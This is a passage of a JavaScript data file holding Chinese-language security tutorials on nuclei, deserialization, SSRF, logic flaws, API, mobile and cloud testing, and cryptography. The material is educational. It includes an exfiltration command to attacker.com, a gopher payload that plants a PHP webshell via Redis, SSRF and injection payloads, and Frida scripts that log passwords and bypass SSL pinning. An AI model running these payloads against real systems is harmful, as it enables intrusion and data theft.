nuclei -l urls.txt

# 指定模板
nuclei -u http://target.com -t cves/

# 输出结果
nuclei -u http://target.com -o results.txt
\`\`\`

## 模板管理

\`\`\`bash
# 更新模板
nuclei -update-templates

# 查看模板
nuclei -tl

# 按标签扫描
nuclei -u http://target.com -tags cve,rce

# 按严重程度
nuclei -u http://target.com -severity critical,high
\`\`\`

## 高级用法

\`\`\`bash
# 使用代理
nuclei -u http://target.com -proxy http://127.0.0.1:8080

# 并发控制
nuclei -l urls.txt -c 50

# 排除模板
nuclei -u http://target.com -exclude-tags dos

# 自定义模板
nuclei -u http://target.com -t custom-template.yaml
\`\`\`

## 自定义模板

\`\`\`yaml
id: custom-sqli
info:
  name: Custom SQL Injection
  severity: high
  description: Detects SQL injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'"
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql"
        condition: or
\`\`\`

## 常用参数

| 参数 | 说明 |
|------|------|
| -u | 目标URL |
| -l | 目标列表 |
| -t | 模板目录 |
| -severity | 严重程度 |
| -tags | 标签过滤 |
| -proxy | 代理 |
| -o | 输出文件 |
| -json | JSON格式输出 |
    `
  },
  // Web安全进阶
  {
    slug: 'deserialization',
    title: '反序列化漏洞详解',
    date: '2026-06-19',
    category: 'websec-advanced',
    subcategory: 'deserialization',
    tags: ['Web安全', '反序列化', 'Java', 'PHP'],
    summary: '各语言反序列化漏洞原理和利用方法。',
    content: `
## 什么是反序列化漏洞

反序列化是将序列化的数据恢复为对象的过程。当应用不安全地反序列化用户输入时，攻击者可构造恶意对象执行任意代码。

## PHP 反序列化

### 基础概念

\`\`\`php
// 序列化
$obj = new User("admin");
echo serialize($obj);  // O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化
$data = 'O:4:"User":1:{s:4:"name";s:5:"admin";}';
$obj = unserialize($data);
\`\`\`

### 魔术方法

\`\`\`php
__construct()    // 对象创建时
__destruct()     // 对象销毁时
__toString()     // 对象转字符串时
__wakeup()       // 反序列化时
__sleep()        // 序列化时
__call()         // 调用不存在方法时
\`\`\`

### 利用链构造

\`\`\`php
class FileHandler {
    public $filename;
    public function __destruct() {
        echo file_get_contents($this->filename);
    }
}

// 构造payload
$a = new FileHandler();
$a->filename = "/etc/passwd";
echo serialize($a);
\`\`\`

## Java 反序列化

### 基础

\`\`\`java
// 序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("obj.ser"));
oos.writeObject(user);

// 反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("obj.ser"));
Object obj = ois.readObject();
\`\`\`

### 常见漏洞

- **Apache Commons Collections**
- **Fastjson**
- **WebLogic**
- **Shiro**

### ysoserial 工具

\`\`\`bash
# 生成payload
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

# 使用
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/steal?c=$(whoami)"
\`\`\`

## PHP 反序列化实战

### 读取文件

\`\`\`php
class Logger {
    public $logfile;
    public function __destruct() {
        file_put_contents($this->logfile, "logged");
    }
}

// 构造payload读取文件
\`\`\`

### 写入Webshell

\`\`\`php
class FileWriter {
    public $filename;
    public $content;
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}
\`\`\`

## 防御方案

1. 禁用用户输入的反序列化
2. 使用白名单验证类
3. 使用 JSON 替代原生序列化
4. 升级依赖库
    `
  },
  {
    slug: 'ssrf',
    title: 'SSRF 服务端请求伪造',
    date: '2026-06-18',
    category: 'websec-advanced',
    subcategory: 'ssrf',
    tags: ['Web安全', 'SSRF', '内网'],
    summary: 'SSRF 漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 SSRF

SSRF（Server-Side Request Forgery）服务端请求伪造，攻击者利用服务器发起请求，访问内部资源或绕过防火墙。

## 常见触发场景

- 图片加载/上传
- 钩子/回调功能
- 文件处理
- API 代理
- Webhook

## 利用方式

### 1. 读取本地文件

\`\`\`
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
\`\`\`

### 2. 扫描内网

\`\`\`
?url=http://192.168.1.1:8080/
?url=http://127.0.0.1:3306/
\`\`\`

### 3. 攻击内网服务

\`\`\`
?url=http://192.168.1.100/admin
?url=redis://127.0.0.1:6379/
\`\`\`

### 4. 云环境元数据

\`\`\`
# AWS
?url=http://169.254.169.254/latest/meta-data/

# 阿里云
?url=http://100.100.100.200/latest/meta-data/
\`\`\`

## 绕过技巧

### IP 地址变形

\`\`\`
http://0x7f000001/       # 十六进制
http://2130706433/       # 十进制
http://0177.0.0.1/       # 八进制
http://127.1/            # 省略写法
http://127.0.0.1.nip.io/ # DNS重绑定
\`\`\`

### 协议绕过

\`\`\`
file:///etc/passwd
gopher://127.0.0.1:6379/
dict://127.0.0.1:6379/
\`\`\`

### URL 编码

\`\`\`
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
\`\`\`

## 利用 Gopher 协议攻击 Redis

\`\`\`
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp eval($_POST['cmd']); %3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
\`\`\`

## 防御方案

1. 白名单限制可访问的域名/IP
2. 禁用不需要的协议（file://、gopher://）
3. 禁止访问内网地址
4. 使用网络层隔离
    `
  },
  {
    slug: 'logic-vuln',
    title: '逻辑漏洞挖掘',
    date: '2026-06-16',
    category: 'websec-advanced',
    subcategory: 'logic-vuln',
    tags: ['Web安全', '逻辑漏洞', '业务安全'],
    summary: '常见业务逻辑漏洞类型和挖掘方法。',
    content: `
## 什么是逻辑漏洞

逻辑漏洞是由于程序逻辑设计不当，导致攻击者可以绕过正常业务流程的漏洞。

## 常见类型

### 1. 越权漏洞

#### 水平越权
\`\`\`
# 修改用户ID查看他人信息
GET /api/user/123 → GET /api/user/456
\`\`\`

#### 垂直越权
\`\`\`
# 普通用户访问管理员接口
GET /admin/dashboard
\`\`\`

### 2. 支付漏洞

#### 价格篡改
\`\`\`
# 修改价格参数
amount=100 → amount=0.01
\`\`\`

#### 数量篡改
\`\`\`
# 修改购买数量为负数
quantity=1 → quantity=-1
\`\`\`

### 3. 验证码漏洞

- 验证码回显在响应中
- 验证码可重复使用
- 可爆破验证码
- 客户端验证

### 4. 短信/邮箱轰炸

\`\`\`
# 重复发送验证码
POST /api/send_sms
phone=13800138000
# 无频率限制
\`\`\`

### 5. 数据篡改

\`\`\`
# 修改请求中的敏感字段
{"username":"admin", "role":"user"} → {"username":"admin", "role":"admin"}
\`\`\`

### 6. 竞态条件

\`\`\`
# 并发请求导致重复操作
同时发送两个购买请求 → 扣款一次，获得两件商品
\`\`\`

### 7. 回调地址

\`\`\`
# 修改回调URL
callback=http://attacker.com/steal
\`\`\`

## 接口测试

### 参数篡改
- 修改用户ID、订单号
- 修改价格、数量
- 修改角色、权限

### 流程跳过
- 跳过验证步骤
- 跳过支付步骤
- 跳过授权步骤

### 重放攻击
- 重复使用验证码
- 重复使用优惠券
- 重复提交订单

## 工具

- Burp Suite
- Postman
- YAKIT

## 防御方案

1. 服务端校验所有参数
2. 使用不可预测的ID（UUID）
3. 关键操作二次验证
4. 限制请求频率
5. 使用签名防篡改
    `
  },
  {
    slug: 'api-security',
    title: 'API 安全测试',
    date: '2026-06-14',
    category: 'websec-advanced',
    subcategory: 'api-security',
    tags: ['Web安全', 'API', 'REST', 'GraphQL'],
    summary: 'API 接口安全测试方法和常见漏洞。',
    content: `
## API 安全风险

### 1. 未授权访问

\`\`\`
# 无认证直接访问
GET /api/users/123
GET /api/admin/config
\`\`\`

### 2. 越权访问

\`\`\`
# 水平越权
GET /api/users/456  # 查看其他用户数据

# 垂直越权
GET /api/admin/users  # 普通用户访问管理接口
\`\`\`

### 3. 注入漏洞

\`\`\`json
// SQL注入
{"username": "admin' OR '1'='1"}

// NoSQL注入
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 命令注入
{"name": "test; whoami"}
\`\`\`

### 4. 批量赋值

\`\`\`json
// 修改不应被修改的字段
{
  "username": "normaluser",
  "role": "admin",      // 不应可修改
  "balance": 1000000    // 不应可修改
}
\`\`\`

### 5. 速率限制绕过

\`\`\`
# 使用不同IP
X-Forwarded-For: 1.1.1.1

# 使用不同User-Agent
User-Agent: Mobile

# 使用不同参数
?phone=13800138000
?phone=13800138001
\`\`\`

## REST API 测试

### 常见检查点

| 方法 | 检查点 |
|------|--------|
| GET | 越权访问、数据泄露 |
| POST | 注入、批量赋值 |
| PUT | 越权修改、数据篡改 |
| DELETE | 越权删除 |
| OPTIONS | CORS配置 |

### HTTP 头检查

\`\`\`
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
\`\`\`

## GraphQL 安全

### 内省查询

\`\`\`graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
\`\`\`

### 常见漏洞

- 内省查询泄露API结构
- 批量查询导致DoS
- 注入漏洞

## JWT 安全

### 常见问题

\`\`\`
# 算法混淆
{"alg": "none"}

# 弱密钥
HS256 使用弱密钥

# 密钥泄露
\`\`\`

### 检查命令

\`\`\`bash
# JWT解析
jwt_tool token.txt

# 爆破密钥
hashcat -m 16500 jwt.txt wordlist.txt
\`\`\`

## 防御方案

1. 实施认证和授权
2. 输入验证
3. 速率限制
4. 日志监控
5. 使用 HTTPS
6. API 网关
    `
  },
  {
    slug: 'wasm-reverse',
    title: 'WebAssembly 逆向入门',
    date: '2026-06-12',
    category: 'websec-advanced',
    subcategory: 'wasm',
    tags: ['Web安全', 'WASM', '逆向'],
    summary: 'WebAssembly 逆向分析基础。',
    content: `
## 什么是 WebAssembly

WebAssembly（WASM）是一种可移植的二进制格式，可在浏览器中运行。常用于保护前端敏感逻辑。

## WASM 文件分析

### 识别 WASM

\`\`\`javascript
// 检查是否加载了WASM
const wasmModule = new WebAssembly.Module(buffer);
console.log(WebAssembly.Module.exports(wasmModule));
\`\`\`

### 使用 wasm-decompile

\`\`\`bash
# 安装
npm install -g wabt

# 反编译
wasm-decompile module.wasm -o output.c
\`\`\`

### 使用 wasm-objdump

\`\`\`bash
# 查看结构
wasm-objdump -x module.wasm

# 反汇编
wasm-objdump -d module.wasm
\`\`\`

## 常见逆向工具

| 工具 | 用途 |
|------|------|
| wasm-decompile | 反编译为伪C代码 |
| wasm-objdump | 查看结构和反汇编 |
| Ghidra | 二进制分析 |
| Binary Ninja | 二进制分析 |
| IDA Pro | 二进制分析 |

## 浏览器调试

### Chrome DevTools

1. 打开 Sources 面板
2. 找到 WASM 文件
3. 设置断点调试

### 导出函数分析

\`\`\`javascript
// 获取WASM导出函数
const exports = instance.exports;
console.log(Object.keys(exports));
\`\`\`

## 逆向流程

1. 定位 WASM 文件
2. 分析导出函数
3. 反编译分析逻辑
4. 找到关键函数
5. 编写调用脚本

## 实战技巧

\`\`\`javascript
// Hook WASM函数
const originalFn = exports.targetFunction;
exports.targetFunction = function(...args) {
    console.log('Args:', args);
    const result = originalFn(...args);
    console.log('Result:', result);
    return result;
};
\`\`\`
    `
  },
  // 移动端安全
  {
    slug: 'android-reverse',
    title: 'Android 逆向基础',
    date: '2026-06-15',
    category: 'mobile',
    subcategory: 'android-reverse',
    tags: ['移动端安全', 'Android', '逆向'],
    summary: 'Android APK 逆向分析基础。',
    content: `
## Android 逆向工具

| 工具 | 用途 |
|------|------|
| jadx | APK 反编译 |
| apktool | 资源解包 |
| dex2jar | DEX 转 JAR |
| JD-GUI | Java 反编译器 |
| Frida | 动态Hook |
| Objection | 移动安全框架 |

## 反编译流程

\`\`\`bash
# jadx 反编译
jadx -d output/ target.apk

# apktool 解包
apktool d target.apk

# dex2jar 转换
d2j-dex2jar target.apk
\`\`\`

## 常见保护

### 代码混淆

\`\`\`java
// 混淆前
public class UserManager {
    public void login(String username, String password) { }
}

// 混淆后
public class a {
    public void b(String c, String d) { }
}
\`\`\`

### 加壳

- VMP（虚拟机保护）
- DexProtector
- 360加固
- 腾讯乐固

## Frida Hook

### Java Hook

\`\`\`javascript
// Hook Java 方法
Java.perform(function() {
    var UserManager = Java.use("com.target.UserManager");
    UserManager.login.implementation = function(username, password) {
        console.log("Username: " + username);
        console.log("Password: " + password);
        return this.login(username, password);
    };
});
\`\`\`

### Native Hook

\`\`\`javascript
// Hook native函数
Interceptor.attach(Module.findExportByName("libtarget.so", "check"), {
    onEnter: function(args) {
        console.log("Arg0: " + Memory.readUtf8String(args[0]));
    },
    onLeave: function(retval) {
        console.log("Return: " + retval);
        retval.replace(1);  // 修改返回值
    }
});
\`\`\`

## APK 结构

\`\`\`
target.apk
├── AndroidManifest.xml    # 配置文件
├── classes.dex            # DEX代码
├── resources.arsc         # 资源文件
├── lib/                   # Native库
├── assets/                # 资源文件
└── META-INF/              # 签名信息
\`\`\`

## 签名绕过

\`\`\`bash
# 使用apktool解包
apktool d target.apk

# 修改后重新打包
apktool b target/

# 签名
jarsigner -keystore keystore.apk target.apk alias
\`\`\`
    `
  },
  {
    slug: 'android-pentest',
    title: 'Android 渗透测试',
    date: '2026-06-13',
    category: 'mobile',
    subcategory: 'android-pentest',
    tags: ['移动端安全', 'Android', '渗透测试'],
    summary: 'Android 应用安全测试方法。',
    content: `
## 测试环境搭建

\`\`\`bash
# 安装ADB
apt install android-tools-adb

# 连接设备
adb devices
adb shell

# 安装APK
adb install target.apk
\`\`\`

## 组件安全测试

### Activity 暴露

\`\`\`xml
<!-- AndroidManifest.xml -->
<activity android:exported="true" />
\`\`\`

\`\`\`bash
# 启动暴露的Activity
adb shell am start -n com.target/.MainActivity
\`\`\`

### Service 暴露

\`\`\`bash
# 启动服务
adb shell am startservice com.target/.MyService
\`\`\`

### Content Provider

\`\`\`bash
# 查询ContentProvider
adb shell content query --uri content://com.target.provider/data
\`\`\`

### BroadcastReceiver

\`\`\`bash
# 发送广播
adb shell am broadcast -a com.target.ACTION
\`\`\`

## 数据存储安全

### SharedPreferences

\`\`\`bash
# 查找SharedPreferences
adb shell run-as com.target cat /data/data/com.target/shared_prefs/*.xml
\`\`\`

### SQLite 数据库

\`\`\`bash
# 查找数据库
adb shell run-as com.target ls /data/data/com.target/databases/

# 导出数据库
adb pull /data/data/com.target/databases/app.db
\`\`\`

## 流量分析

### 使用 BurpSuite

\`\`\`
1. 配置Burp代理
2. 安装Burp证书
3. 设置手机代理
4. 抓包分析
\`\`\`

### 使用 Frida

\`\`\`javascript
// SSL Pinning绕过
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: "com.target.TrustManager",
        implements: [Java.use("javax.net.ssl.X509TrustManager")],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
});
\`\`\`

## 常见漏洞

1. 组件暴露
2. 数据明文存储
3. 弱加密算法
4. 不安全的网络通信
5. 代码可逆向
    `
  },
  {
    slug: 'ios-reverse',
    title: 'iOS 逆向基础',
    date: '2026-06-11',
    category: 'mobile',
    subcategory: 'ios-reverse',
    tags: ['移动端安全', 'iOS', '逆向'],
    summary: 'iOS 应用逆向分析基础。',
    content: `
## iOS 逆向工具

| 工具 | 用途 |
|------|------|
| class-dump | 导出类信息 |
| Hopper | 二进制分析 |
| IDA Pro | 二进制分析 |
| Frida | 动态Hook |
| Reveal | UI分析 |
| Keychain-Dumper | 钥匙串导出 |

## IPA 文件结构

\`\`\`
target.ipa
├── Payload/
│   └── target.app/
│       ├── Info.plist
│       ├── target (Mach-O)
│       ├── Frameworks/
│       └── _CodeSignature/
\`\`\`

## 反编译流程

\`\`\`bash
# 解压IPA
unzip target.ipa -d output/

# 导出类信息
class-dump target.app/target > classes.h

# 使用Hopper分析
\`\`\`

## 代码签名

\`\`\`bash
# 查看签名
codesign -dvvv target.app

# 重签名
codesign -f -s "iPhone Developer: xxx" target.app

# 使用ios-deploy
ios-deploy --bundle target.app
\`\`\`

## Frida Hook

### Objective-C Hook

\`\`\`javascript
// Hook OC方法
var_resolver = new ApiResolver("objc");
var resolver = new ApiResolver("objc");
resolver.enumerateMatches({
    pattern: '-[* userController]',
    onMatch: function(match) {
        var impl = new NativeFunction(match.address, 'void', ['pointer', 'pointer']);
        Interceptor.attach(match.address, {
            onEnter: function(args) {
                var password = ObjC.Object(args[2]);
                console.log("Password: " + password.toString());
            }
        });
    }
});
\`\`\`

### Swift Hook

\`\`\`javascript
// Hook Swift函数
var module = Process.getModuleByName("target");
module.enumerateSymbols().forEach(function(symbol) {
    if (symbol.name.indexOf("ViewController") !== -1) {
        console.log(symbol.name);
    }
});
\`\`\`

## 越狱检测绕过

\`\`\`javascript
// 常见越狱检测
var jailbreakChecks = [
    "/Applications/Cydia.app",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/bin/bash",
    "/usr/sbin/sshd"
];

// 绕过
Interceptor.attach(Module.findExportByName(null, "access"), {
    onEnter: function(args) {
        this.path = args[0].readUtf8String();
    },
    onLeave: function(retval) {
        if (this.path && jailbreakChecks.indexOf(this.path) !== -1) {
            retval.replace(-1);
        }
    }
});
\`\`\`

## Keychain 分析

\`\`\`bash
# 导出钥匙串
iOS/keychain-dumper

# 使用Keychain Dump
keychain-dumper -a
\`\`\`
    `
  },
  {
    slug: 'miniapp-pentest',
    title: '微信小程序渗透测试',
    date: '2026-06-10',
    category: 'mobile',
    subcategory: 'miniapp-pentest',
    tags: ['移动端安全', '小程序', '渗透测试'],
    summary: '微信小程序安全测试方法。',
    content: `
## 小程序结构

\`\`\`
target/
├── app.js
├── app.json
├── app.wxss
├── pages/
└── project.config.json
\`\`\`

## 获取小程序包

### 方法1：模拟器

\`\`\`
1. 使用PC版微信
2. 打开小程序
3. 在文档目录查找wxapkg文件
\`\`\`

### 方法2：抓包

\`\`\`
1. 使用BurpSuite抓包
2. 找到小程序下载链接
3. 下载wxapkg文件
\`\`\`

## 反编译

\`\`\`bash
# 安装工具
npm install -g wxappUnpacker

# 反编译
wxappUnpacker target.wxapkg

# 或使用 unveilr
unveilr target.wxapkg -o output/
\`\`\`

## 安全测试

### 接口测试

\`\`\`
1. 找到API接口
2. 测试未授权访问
3. 测试参数篡改
4. 测试注入漏洞
\`\`\`

### 配置文件

\`\`\`javascript
// 检查app.json
{
  "appid": "wx...",
  "serverUrl": "https://api.target.com"
}

// 检查是否有敏感信息
\`\`\`

### 代码审计

\`\`\`javascript
// 检查硬编码密钥
var secret = "1234567890abcdef";

// 检查不安全存储
wx.setStorageSync('token', token);
\`\`\`

## 常见漏洞

1. 接口未授权
2. 敏感信息泄露
3. 不安全的数据存储
4. 逻辑漏洞
5. 注入漏洞

## 工具

- **wxappUnpacker**：反编译
- **unveilr**：反编译
- **BurpSuite**：抓包
- **Fiddler**：抓包
    `
  },
  // 云安全
  {
    slug: 'aws-security',
    title: 'AWS 安全配置指南',
    date: '2026-06-09',
    category: 'cloud',
    subcategory: 'aws-security',
    tags: ['云安全', 'AWS', '配置'],
    summary: 'AWS 云环境安全配置最佳实践。',
    content: `
## IAM 安全

### 最小权限原则

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket/*"
    }
  ]
}
\`\`\`

### 多因素认证

\`\`\`bash
# 启用MFA
aws iam enable-mfa-user --user-name admin --serial-number arn:aws:iam::123456789:mfa/admin
\`\`\`

## S3 存储桶安全

### 访问控制

\`\`\`bash
# 检查公开访问
aws s3api get-bucket-acl --bucket my-bucket

# 禁用公开访问
aws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
\`\`\`

### 加密

\`\`\`bash
# 启用默认加密
aws s3api put-bucket-encryption --bucket my-bucket --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
\`\`\`

## EC2 安全

### 安全组

\`\`\`bash
# 只开放必要端口
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr 0.0.0.0/0
\`\`\`

### 实例元数据

\`\`\`bash
# 禁用元数据（防SSRF）
curl http://169.254.169.254/latest/meta-data/
\`\`\`

## CloudTrail

\`\`\`bash
# 启用日志
aws cloudtrail create-logging-status --name my-trail --s3-bucket-name my-bucket

# 查看日志
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
\`\`\`

## 安全工具

- **Prowler**：AWS安全审计
- **ScoutSuite**：云安全审计
- **CloudMapper**：AWS架构可视化
    `
  },
  {
    slug: 'docker-security',
    title: 'Docker 安全最佳实践',
    date: '2026-06-08',
    category: 'cloud',
    subcategory: 'docker-security',
    tags: ['云安全', 'Docker', '容器'],
    summary: 'Docker 容器安全配置和加固。',
    content: `
## 镜像安全

### 使用最小基础镜像

\`\`\`dockerfile
# 使用Alpine
FROM alpine:3.18

# 避免使用
FROM ubuntu:latest
\`\`\`

### 非Root用户

\`\`\`dockerfile
RUN adduser -D appuser
USER appuser
\`\`\`

### 扫描漏洞

\`\`\`bash
# 使用Trivy
trivy image nginx:latest

# 使用Snyk
snyk container test nginx:latest
\`\`\`

## 运行时安全

### 只读文件系统

\`\`\`bash
docker run --read-only --tmpfs /tmp nginx
\`\`\`

### 资源限制

\`\`\`bash
docker run --memory=512m --cpus=1 nginx
\`\`\`

### 禁用特权

\`\`\`bash
# 避免使用
docker run --privileged nginx
\`\`\`

## 网络安全

### 使用自定义网络

\`\`\`bash
docker network create --driver bridge my-network
docker run --network my-network nginx
\`\`\`

### 限制容器间通信

\`\`\`bash
docker run --icc=false nginx
\`\`\`

## Docker Bench

\`\`\`bash
# 运行安全检查
docker run -it --net host --pid host docker/docker-bench-security
\`\`\`

## 常见风险

1. 特权容器逃逸
2. 镜像漏洞
3. 敏感信息泄露
4. 不安全的网络配置
5. 资源滥用
    `
  },
  {
    slug: 'k8s-security',
    title: 'Kubernetes 安全',
    date: '2026-06-07',
    category: 'cloud',
    subcategory: 'k8s-security',
    tags: ['云安全', 'Kubernetes', 'K8s'],
    summary: 'Kubernetes 集群安全配置。',
    content: `
## RBAC 权限控制

\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
\`\`\`

## Pod 安全

### Security Context

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    image: nginx
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
\`\`\`

## 网络策略

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
\`\`\`

## Secret 管理

\`\`\`bash
# 创建Secret
kubectl create secret generic my-secret --from-literal=password=xxx

# 加密存储
# 启用加密
\`\`\`

## 安全审计

\`\`\`bash
# 检查集群配置
kube-bench run

# 检查镜像漏洞
trivy image nginx:latest
\`\`\`

## 常见攻击面

1. API Server 未授权
2. etcd 数据泄露
3. 容器逃逸
4. 横向移动
5. 特权提升
    `
  },
  // 密码学
  {
    slug: 'crypto-basics',
    title: '密码学基础',
    date: '2026-06-20',
    category: 'crypto',
    subcategory: 'crypto-basic',
    tags: ['密码学', '基础', 'CTF'],
    summary: '密码学基本概念和常见加密方式。',
    content: `
## 密码学分类

### 对称加密
加密和解密使用相同密钥。

### 非对称加密
使用公钥加密，私钥解密。

### 哈希函数
单向加密，不可逆。

## 常见编码

### Base64
\`\`\`bash
echo "hello" | base64
echo "aGVsbG8=" | base64 -d
\`\`\`

### URL编码
\`\`\`
空格 → %20
< → %3C
> → %3E
\`\`\`

### Hex编码
\`\`\`
48656c6c6f → Hello
\`\`\`

### ROT13
\`\`\`
hello → uryyb
\`\`\`

### 二进制
\`\`\`
01001000 01100101 01101100 01101100 01101111 → Hello
\`\`\`

## CTF 常见

\`\`\`
Base64 → Base32 → Base16
URL编码
HTML实体编码
Unicode编码
UUencode
XXencode
\`\`\`
    `
  },
  {
    slug: 'hash-cracking',
    title: '哈希与破解',
    date: '2026-06-18',
    category: 'crypto',
    subcategory: 'hash-crack',
    tags: ['密码学', '哈希', '破解'],
    summary: '常见哈希算法和破解方法。',
    content: `
## 常见哈希算法

| 算法 | 输出长度 | 特点 |
|------|----------|------|
| MD5 | 128位 | 已不安全 |
| SHA-1 | 160位 | 已不安全 |
| SHA-256 | 256位 | 安全 |
| SHA-512 | 512位 | 安全 |

## 哈希识别

\`\`\`
MD5: 32位16进制
SHA-1: 40位16进制
SHA-256: 64位16进制
\`\`\`

## 在线破解

- https://crackstation.net/
- https://hashes.com/
- https://www.cmd5.com/

## 离线破解

### Hashcat

\`\`\`bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA-1
hashcat -m 100 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt
\`\`\`

### John the Ripper

\`\`\`bash
# 自动识别
john hash.txt

# 指定格式
john --format=raw-md5 hash.txt

# 使用字典
john --wordlist=passwords.txt hash.txt
\`\`\`

## 密码字典

- rockyou.txt
- SecLists
- PayloadsAllTheThings
    `
  },
  {
    slug: 'symmetric-crypto',
    title: '对称加密详解',
    date: '2026-06-15',
    category: 'crypto',
    subcategory: 'symmetric-crypto',
    tags: ['密码学', '对称加密', 'AES', 'DES'],
    summary: '常见对称加密算法和攻击方法。',
    content: `
## 常见算法

### DES
- 密钥长度：56位
- 分组长度：64位
- 已不安全

### 3DES
- 密钥长度：168位
- 已不安全

### AES
- 密钥长度：128/192/256位
- 分组长度：128位
- 目前安全

## 加密模式

### ECB（电子密码本）
- 明文分组独立加密
- 相同明文产生相同密文
- 不安全

### CBC（密码块链接）
- 需要初始化向量（IV）
- 前一个密文块与下一个明文异或
- 常用

### CTR
- 将计数器加密后与明文异或
- 可并行处理

## 常见攻击

### ECB 模式攻击
\`\`\`
# 相同明文块产生相同密文块
# 可进行重放攻击
\`\`\`

### Padding Oracle
\`\`\`
# 利用填充错误信息
# 逐字节解密
\`\`\`

### IV 重用
\`\`\`
# 相同IV加密相同密文
# 可进行异或攻击
\`\`\`

## CTF 工具

\`\`\`python
from Crypto.Cipher import AES

# AES 解密
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)
\`\`\`
    `
  },
  {
    slug: 'asymmetric-crypto',
    title: '非对称加密详解',
    date: '2026-06-12',
    category: 'crypto',
    subcategory: 'asymmetric-crypto',
    tags: ['密码学', 'RSA', '非对称加密'],
    summary: 'RSA 等非对称加密算法原理和攻击方法。',
    content: `
## RSA 算法

### 原理
1. 选择两个大质数 p, q
2. 计算 n = p * q
3. 计算 φ(n) = (p-1)(q-1)
4. 选择 e 使 gcd(e, φ(n)) = 1
5. 计算 d 使 e*d ≡ 1 (mod φ(n))
6. 公钥 (e, n)，私钥 (d, n)

### 加解密
\`\`\`
加密：c = m^e mod n
解密：m = c^d mod n
\`\`\`

## RSA 攻击

### 小公钥指数攻击
\`\`\`
# e 很小时，m^e < n
# 直接开 e 次方根
\`\`\`

### 共模攻击
\`\`\`
# 相同 n，不同 e 加密相同明文
\`\`\`

### 因数分解
\`\`\`
# 分解 n = p * q
# 使用 yafu、msieve、factordb.com
\`\`\`

### Wiener 攻击
\`\`\`
# d 很小时
# 使用连分数攻击
\`\`\`

### Coppersmith 攻击
\`\`\`
# 已知明文部分
\`\`\`

## CTF 工具

\`\`\`python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# 读取公钥
key = RSA.import_key(open('pub.pem').read())

# 解密
cipher = PKCS1_OAEP.new(key)
plaintext = cipher.decrypt(ciphertext)
\`\`\`
    `
  },
  // 逆向工程
  {
    slug: 're-basics',
    title: '逆向工程基础',
    date: '2026-06-17',
    category: 're',
    subcategory: 're-basic',
    tags: ['逆向工程', '基础', 'CTF'],
    summary: '逆向工程基本概念和常用工具。',
    content: `
## 什么是逆向工程

逆向工程是分析程序二进制代码，理解其功能和逻辑的过程。

## 逆向流程

1. **识别文件类型**
2. **静态分析**
3. **动态调试**
4. **代码分析**
5. **编写脚本**

## 文件类型识别

\`\`\`bash
file target              # Linux
binwalk target           # 检查嵌入文件
strings target           # 提取字符串
xxd target | head        # 十六进制查看
\`\`\`

## PE 文件结构（Windows）

\`\`\`
┌─────────────────┐
│ DOS Header      │
├─────────────────┤
│ PE Header       │
├─────────────────┤
│ Section Table   │
├─────────────────┤
│ .text           │ ← 代码段
│ .data           │ ← 数据段
│ .rdata          │ ← 只读数据
│ .rsrc           │ ← 资源
└─────────────────┘
\`\`\`

## ELF 文件结构（Linux）

\`\`\`
┌─────────────────┐
│ ELF Header      │
├─────────────────┤
│ Program Header  │
├─────────────────┤
│ .text           │ ← 代码段
│ .data           │ ← 数据段
│ .bss            │ ← 未初始化数据
│ .rodata         │ ← 只读数据
└─────────────────┘
\`\`\`

## 常用工具

| 工具 | 用途 |
|------|------|
| IDA Pro | 反汇编分析 |
| Ghidra | 反编译 |
| x64dbg | 动态调试 |
| OllyDbg | 动态调试 |
| Radare2 | 逆向框架 |
